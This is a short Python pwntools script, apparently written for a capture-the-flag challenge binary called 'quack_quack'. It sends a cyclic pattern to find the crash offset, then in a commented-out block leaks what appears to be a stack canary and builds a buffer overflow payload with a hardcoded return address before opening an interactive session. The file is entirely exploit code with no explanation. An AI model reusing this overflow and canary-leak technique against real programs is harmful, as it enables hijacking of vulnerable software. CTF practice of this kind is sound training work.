#!/usr/bin/python3

from pwn import *

p = process("./quack_quack")

offset = 89
junk = b"A"*offset

quack = b"Quack Quack "

payload = cyclic(120)

# p.sendafter(">", junk + quack)
# p.recvuntil(b"Quack Quack ")
p.sendlineafter(b">", payload)
p.wait()
print(f"the rsp => {p.corefile.rsp}")


"""
print("printing the process data and junk2")
# data = p.recvuntil(b"Quack Quack ")
junk2 = p.recvuntil(b" ready to fight the Duck?", drop=True)

leak = u64(b'\x00' + junk2[:7])

exploit = b'A'*(offset - 1 )
exploit += p64(leak)

exploit += p64(0)
exploit += p64(0x0040137f)

p.sendline(exploit)
p.interactive()
"""
